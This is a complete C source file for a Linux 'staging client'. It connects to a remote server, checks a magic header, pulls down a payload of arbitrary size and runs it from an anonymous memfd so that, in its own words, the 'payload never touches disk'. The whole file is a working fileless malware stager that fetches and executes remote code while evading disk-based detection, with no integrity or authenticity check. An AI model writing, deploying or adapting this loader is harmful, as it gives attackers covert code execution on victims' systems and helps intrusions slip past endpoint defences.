/*
 * client.c — staging client
 *
 * Usage: ./client <ip> <port>
 *
 * 1. Connect to staging server
 * 2. Validate magic header
 * 3. Receive payload into memory
 * 4. memfd_create + write + fexecve — payload never touches disk
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/memfd.h>

/* MFD_EXEC added in Linux 6.3 — required to execute memfds on modern kernels */
#ifndef MFD_EXEC
#define MFD_EXEC 0x0010U
#endif

/* fexecve(3) resolves /proc/self/fd/<n> which for a memfd returns
 * "/memfd:name (deleted)" — a path qemu user-mode can't open back.
 * execve on the /proc/self/fd/<n> symlink itself works because the
 * kernel follows the fd, not the resolved name. */
static int exec_memfd(int mfd, char **argv, char **envp) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", mfd);
    execve(path, argv, envp);
    return -1;
}

#define STAGE_MAGIC 0xFEEDC0DE

struct stage_hdr {
    uint32_t magic;
    uint32_t size;
};

static int recv_exact(int fd, void *buf, size_t n) {
    char *p = buf;
    while (n > 0) {
        ssize_t r = recv(fd, p, n, 0);
        if (r <= 0) return -1;
        p += r; n -= r;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "usage: client <ip> <port>\n");
        return 1;
    }

    int port = atoi(argv[2]);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in srv = {0};
    srv.sin_family      = AF_INET;
    srv.sin_port        = htons(port);
    inet_pton(AF_INET, argv[1], &srv.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        perror("connect"); return 1;
    }

    /* receive and validate header */
    struct stage_hdr hdr;
    if (recv_exact(sockfd, &hdr, sizeof(hdr)) < 0) {
        fprintf(stderr, "recv header failed\n"); return 1;
    }
    if (ntohl(hdr.magic) != STAGE_MAGIC) {
        fprintf(stderr, "bad magic — wrong server?\n"); return 1;
    }

    uint32_t psz = ntohl(hdr.size);
    printf("receiving %u byte payload\n", psz);

    /* receive payload into heap buffer */
    void *buf = malloc(psz);
    if (recv_exact(sockfd, buf, psz) < 0) {
        fprintf(stderr, "recv payload failed\n"); return 1;
    }
    close(sockfd);

    /* write into memfd and fexecve — no disk write */
    int mfd = (int)syscall(SYS_memfd_create, "payload", MFD_CLOEXEC | MFD_EXEC);
    if (mfd < 0) { perror("memfd_create"); return 1; }

    size_t written = 0;
    while (written < psz) {
        ssize_t w = write(mfd, (char *)buf + written, psz - written);
        if (w <= 0) { perror("write"); return 1; }
        written += w;
    }

    char *exec_argv[] = { "payload", NULL };
    char *exec_envp[] = { NULL };
    exec_memfd(mfd, exec_argv, exec_envp);

    perror("exec_memfd");
    return 1;
}
